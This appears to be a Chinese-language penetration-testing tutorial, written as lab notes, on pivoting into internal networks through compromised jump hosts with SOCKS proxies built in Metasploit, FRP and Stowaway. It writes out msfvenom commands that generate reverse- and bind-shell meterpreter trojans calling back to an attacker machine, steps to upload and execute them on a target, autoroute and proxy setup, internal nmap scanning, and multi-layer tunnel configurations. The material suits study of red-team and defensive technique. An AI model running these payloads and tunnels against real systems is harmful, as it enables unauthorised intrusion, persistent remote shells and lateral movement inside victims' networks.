# Socks代理

## 通过msf代理

### 一、拿到跳板机的shell

#### 1、getshell

利用跳板机部署的web应用获得shell。

#### 2、反弹shell

利用msf生成木马

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.105 lport=9999 R > 1.php
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.1.105 lport=9999 -f elf > 1.elf

#同时新开一个终端，打开msf的监听
msfconsole -q
msf6 > use multi/handler
msf6 exploit(multi/handler) > set lhost 192.168.1.105
msf6 exploit(multi/handler) > set lport 9999
msf6 exploit(multi/handler) > run -j
```

此处也可根据操作系统不同更换不同的shell。

**上传到跳板机的tmp目录下**（利用第一步的shell，中国蚁剑）

```bash
# 赋予执行权限
chmod 777 1.elf
# 执行程序
./1.elf
```

此时在攻击机的msf监听器可以收到`meterpreter`的`session`

### 二、建立socks代理

**进入`meterpreter`的`session`**

```msf
#设置路由的网段
meterpreter > run autoroute -s 192.168.22.0/24
meterpreter > run autoroute -p
meterpreter > background
```

**使用`msf`的`socks5`模块启动`socks`代理服务**

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run
```

**新开一个终端**，配置 proxychains 代理工具

```bash
vim /etc/proxychains4.conf
#在最结尾处把socks4的代理注释掉，添加下面这一行
socks5 127.0.0.1 1080#这里和msf里的sock是代理端口一样，默认是1080
```

利用proxychains即可完成内网穿透

```bash
proxychains nmap -sT -Pn -p- -n -T4 192.168.22.22#因为ping不走代理所以要禁ping -Pn
```

**中国蚁剑设置代理**

> 选择代理设置
>
> 手动设置代理
>
> 代理协议选择socks5
>
> 代理服务器为攻击机IP（也就是msf所在的IP）
>
> 端口是msf的socks的端口（1080）

### 三、双层代理（获得33网段的代理）

<img src="C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20230105172941597.png" alt="image-20230105172941597" style="zoom: 50%;" />

#### 用`msfvenum`生成一个`正向`连接的shell

```bash
msfvenom -p linux/x64/meterpreter/bind_tcp lport=9998 -f elf > 2.elf
#这个lport是靶机上开放的等待连接的端口
```

将木马上传到`target2`上

```bash
chmod 777 2.elf
./2.elf
```

在msf上创建正向的监听器

```msf
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.22.22
set lport 5555
run
```

#### 添加路由

反弹回`Target2`的`meterpreter shell`之后，添加到`33`网段的路由：

```msf
run autoroute -s 192.168.33.0/24
run autoroute -p
```

此时已经完成了socks代理的设置，不需要再进行后续操作了。

## FRP代理

https://gofrp.org/docs/

### 第一层代理

> frp的文件夹在攻击机和跳板机上都要有，一模一样的复制粘贴就可以了。

#### 攻击机启动frps

```
./frps -c ./frps.ini

cat frps.ini
[common]
bind_port = 7000
```

#### Target1启动frpc

```bash
./frpc -c frpc.ini
```

> ```bash
> cat frpc.ini
> ```
>
> [common]
> server_addr = 192.168.1.105
> server_port = 7000
>
> [socks5]
> type = tcp
> plugin = socks5
> remote_port = 6000

> 这里的6000端口就是攻击机上的代理端口（相当于msf里的那个1080），proxychains的配置文件改成6000端口就可以了。

```bash
vim /etc/proxychains4

#添加下面这一行，把其他的注释掉
socks5 127.0.0.1 6000
```

### 第二层代理

#### 攻击机启动frps（同上）

#### Target1

##### 启动frpc

```
./frpc -c frpc_11.ini
```

> ```
> cat frpc_11.ini
> ```
>
> [common]
> server_addr = 192.168.1.105
> server_port = 7000
>
> [socks5_1]
> type = tcp
> remote_port = 6000
> plugin = socks5
>
> [socks5_to_33]
> type = tcp
> local_ip = 127.0.0.1
> local_port = 6001
> remote_port = 6002

##### 启动frps

```
./frps -c frps_1.ini
```

> ```
> cat frps_1.ini
> ```
>
> [common]
> bind_port = 7000

#### Target2

##### 启动frpc

```
./frpc -c frpc_2.ini
```

> ```
> cat frpc_2.ini
> ```
>
> [common]
> server_addr = 192.168.22.130
> server_port = 7000
>
> [socks5_2]
> type = tcp
> plugin = socks5
> remote_port = 6001

> 这里`[common]`的`server_add`写到`Target1`的内网ip
>
> `[socks5_2]`的`remote_port`写到`Target1`的`[socks5_to_33]`的`local_port`

### 攻击机proxychains

攻击机的`/etc/proxychains4.conf`文件中，改为6002（即`target1`中`[socks5_to_33]`的`remote_port`）

> socks5 127.0.0.1 6002

## Stowaway

### 建立一层socks代理

#### 攻击机上启动admin监听

```bash
./linux_x64_admin -l 9999 -s hack
#-l是端口，-s是密钥
```

#### target1启动agent

```bash
./linux_x64_agent -c 192.168.1.104:9999 -s hack
#-c是admin的IP和端口
```

#### 开启socks代理

进入Target1的node节点，使用socks命令开启socks代理

```bash
use 0
socks 1080
#1080是选择的socks代理端口
```

再用`proxychains`代理就可以了。

### 建立第二层socks代理

#### 1、在node中开启监听

```bash
use 0
listen
1
7070
```

在 Target1 上可以看到 agent 监听了 7070 端口

#### 2、target2连接监听端口

在`Target2`中连接`Target1`监听的`7070`端口

```bash
./linux_x64_agent -c 192.168.22.130:7070 -s hack
#这里是target1的IP和端口
```

#### 3、开启新的socks代理

`admin`接收到新的`node 1`, 进入`node 1`节点开启`socks`代理

```
use 1
socks 1081
```

